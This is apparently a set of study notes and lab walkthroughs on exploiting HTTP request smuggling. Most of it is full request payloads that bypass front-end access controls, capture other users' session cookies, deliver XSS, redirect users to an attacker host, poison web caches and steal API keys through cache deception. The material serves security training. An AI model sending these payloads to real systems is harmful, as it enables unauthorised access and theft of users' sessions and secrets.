# How to exploit HTTP request smuggling vulnerabilities

Suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL. The back-end server then honors every request without further checking. In this situation, an HTTP request smuggling vulnerability can be used to bypass the access controls, by smuggling a request to a restricted URL.

Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

The front-end server sees two requests here, both for /home, and so the requests are forwarded to the back-end server. However, the back-end server sees one request for /home and one request for /admin. It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL.

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

**Solution**

1. Try to visit */admin* and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice:

    ```
    POST / HTTP/1.1
    Host: ac471f221e11274dc0e81fd500690023.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-Ignore: X
    ```

3. Observe that the merged request to */admin* was rejected due to not using the header *Host: localhost*.
4. Issue the following request twice:

    ```
    POST / HTTP/1.1
    Host: ac471f221e11274dc0e81fd500690023.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 54
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    X-Ignore: X
    ```

5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:

    ```
    POST / HTTP/1.1
    Host: ac471f221e11274dc0e81fd500690023.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 116
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10

    x=
    ```

7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete the user *carlos*:

    ```
    POST / HTTP/1.1
    Host: ac471f221e11274dc0e81fd500690023.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 139
    Transfer-Encoding: chunked

    0

    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10

    x=
    ```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

**Solution**

1. Try to visit /admin and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: ac1d1fa61ef75fadc0cb61590085004e.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

4. Observe that the merged request to /admin was rejected due to not using the header Host: localhost.
5. Issue the following request twice:

```
POST / HTTP/1.1
Host: ac1d1fa61ef75fadc0cb61590085004e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:

```
POST / HTTP/1.1
Host: ac1d1fa61ef75fadc0cb61590085004e.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## Revealing front-end request rewriting

The front-end server might:

- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an X-Forwarded-For header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

Suppose an application has a login function that reflects the value of the email parameter:

```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

This results in a response containing the following:

```<input id="email" value="wiener@normal-user.net" type="text">```

Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

The requests will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter. It will then reflect this value back in the response to the second request:

```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

### Exploiting HTTP request smuggling to reveal front-end request rewriting

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

**Solution**

1. Browse to /admin and observe that the admin panel can only be loaded from *127.0.0.1*.

2. Use the site's search function and observe that it reflects the value of the search parameter.
3. Use Burp Repeater to issue the following request twice.

    ```
    POST / HTTP/1.1
    Host: acb31fac1ef8ea1dc02972f900e200ff.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 124
    Transfer-Encoding: chunked

    0

    POST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 200
    Connection: close

    search=test
    ```

4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
5. Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel:

    X-PyerIB-Ip: 109.72.10.228

    ```
    POST / HTTP/1.1
    Host: acb31fac1ef8ea1dc02972f900e200ff.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 143
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-abcdef-Ip: 127.0.0.1 = change it to X-PyerIB-Ip
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    Connection: close

    x=1
    ```

6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:

    ```
    POST / HTTP/1.1
    Host: acb31fac1ef8ea1dc02972f900e200ff.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 166
    Transfer-Encoding: chunked

    0

    GET /admin/delete?username=carlos HTTP/1.1
    X-PyerIB-Ip: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    Connection: close

    x=1
    ```

## Bypassing client authentication

The component that authenticates the client typically passes the relevant details from the certificate to the application or back-end server via one or more non-standard HTTP headers. For example, front-end servers sometimes append a header containing the client's CN to any incoming requests:

```
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

## Capturing other users' requests

Suppose an application uses the following request to submit a blog post comment, which will be stored and displayed on the blog:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

You can perform the following request smuggling attack, which smuggles the data storage request to the back-end server:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

When another user's request is processed by the back-end server, it will be appended to the smuggled request, with the result that the user's request gets stored, including the victim user's session cookie and any other sensitive data:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

You can then retrieve the details of the other user's request by retrieving the stored data in the normal way.

### Exploiting HTTP request smuggling to capture other users'requests

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

**Solution**

1. Visit a blog post and post a comment.
2. Send the *comment-post* request to Burp Repeater, shuffle the body parameters so the *comment* parameter occurs last, and make sure it still works.
3. Increase the *comment-post* request's *Content-Length* to 400, then smuggle it to the back-end server:

    ```
    POST / HTTP/1.1
    Host: ac201fb71f4f0c42c08b3b36000d00d4.web-security-academy.net/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 256
    Transfer-Encoding: chunked

    0

    POST /post/comment HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 400
    Cookie: session=mWT3U7YtIUBWcDzkCDyejiFNjHy4Kceu

    csrf=YnnfoJ6NaCjhUP6SzDIxwCu6WV1tUeSU&postId=4&name=Carlos+Montoya&email=carlos%40email.com&website=&comment=Comment+2
    ```

4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
5. Copy the user's Cookie header from the comment, and use it to access their account.

## Using HTTP request smuggling to exploit reflected XSS

This approach is superior to normal exploitation of reflected XSS in two ways:

- It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.

For example, suppose an application has a reflected XSS vulnerability in the User-Agent header. You can exploit this in a request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

The next user's request will be appended to the smuggled request, and they will receive the reflected XSS payload in the response.

### Exploiting HTTP request smuggling to deliver reflected XSS

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

**Solution**

1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your *User-Agent* header in a hidden input.
3. Inject an XSS payload into the *User-Agent* header and observe that it gets reflected:

    ```"/><script>alert(1)</script>```

4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:

    ```
    POST / HTTP/1.1
    Host: acbf1f261fe746e8c098bbda004a0071.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 150
    Transfer-Encoding: chunked

    0

    GET /post?postId=5 HTTP/1.1
    User-Agent: a"/><script>alert(1)</script>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5

    x=1
    ```

## Using HTTP request smuggling to turn an on-site redirect into an open redirect

Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

The smuggled request will trigger a redirect to the attacker's website, which will affect the next user's request that is processed by the back-end server. For example:

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Here, the user's request was for a JavaScript file that was imported by a page on the web site. The attacker can fully compromise the victim user by returning their own JavaScript in the response.

## Using HTTP request smuggling to perform web cache poisoning

If any part of the front-end infrastructure performs caching of content (generally for performance reasons), then it might be possible to poison the cache with the off-site redirect response. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

In this variant, the attacker sends all of the following to the front-end server:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

The smuggled request reaches the back-end server, which responds as before with the off-site redirect. The front-end server caches this response against what it believes is the URL in the second request, which is /static/include.js:

```
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

From this point onwards, when other users request this URL, they receive the redirection to the attacker's web site.

### Exploiting HTTP request smuggling to perform web cache poisoning

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert *document.cookie*.

**Solution**

1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header:

    ```
    POST / HTTP/1.1
    Host: ac211f921f544b6cc0e5110b00dc0040.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 129
    Transfer-Encoding: chunked

    0

    GET /post/next?postId=3 HTTP/1.1
    Host: anything
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10

    x=1
    ```

2. Observe that you can use this request to make the next request to the website get redirected to */post* on a host of your choice.
3. Go to your exploit server, and create a *text/javascript* file at */post* with the contents:

    ```alert(document.cookie)```

4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:

    ```
    POST / HTTP/1.1
    Host: ac211f921f544b6cc0e5110b00dc0040.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 193
    Transfer-Encoding: chunked

    0

    GET /post/next?postId=3 HTTP/1.1
    Host: exploit-ac321f831ff84b9fc00911b001db0081.web-security-academy.net/post
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10

    x=1
    ```

5. Then fetch */resources/js/tracking.js* by sending the following request:

    ```
    GET /resources/js/tracking.js HTTP/1.1
    Host: ac211f921f544b6cc0e5110b00dc0040.web-security-academy.net
    Connection: close
    ```

    If the attack has succeeded, the response to the *tracking.js* request should be a redirect to your exploit server.
6. Confirm that the cache has been poisoned by repeating the request to *tracking.js* several times and confirming that you receive the redirect every time.

## Using HTTP request smuggling to perform web cache deception

- In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
- In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

In this variant, the attacker smuggles a request that returns some sensitive user-specific content. For example:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

The next request from another user that is forwarded to the back-end server will be appended to the smuggled request, including session cookies and other headers. For example:

```
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

The back-end server responds to this request in the normal way. The URL in the request is for the user's private messages and the request is processed in the context of the victim user's session. The front-end server caches this response against what it believes is the URL in the second request, which is */static/some-image.png*:

```
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

The attacker then visits the static URL and receives the sensitive content that is returned from the cache.

An important caveat here is that the attacker doesn't know the URL against which the sensitive content will be cached, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. The attacker might need to fetch a large number of static URLs to discover the captured content.

### Exploiting HTTP request smuggling to perform web cache deception

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.

To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.

**Solution**

1. Log in to your account and access the user account page.
2. Observe that the response doesn't have any anti-caching headers.
3. Smuggle a request to fetch the API key:

    ```
    POST / HTTP/1.1
    Host: ac7f1f1b1ffa467cc02fc11c00590034.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 42
    Transfer-Encoding: chunked

    0

    GET /my-account HTTP/1.1
    X-Ignore: X
    ```

4. Repeat this request a few times, then load the home page in an incognito browser window.
5. Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources. If it hasn't, repeat the POST requests, force-reload the browser window, and re-run the search.
6. Submit the victim's API key as the lab solution.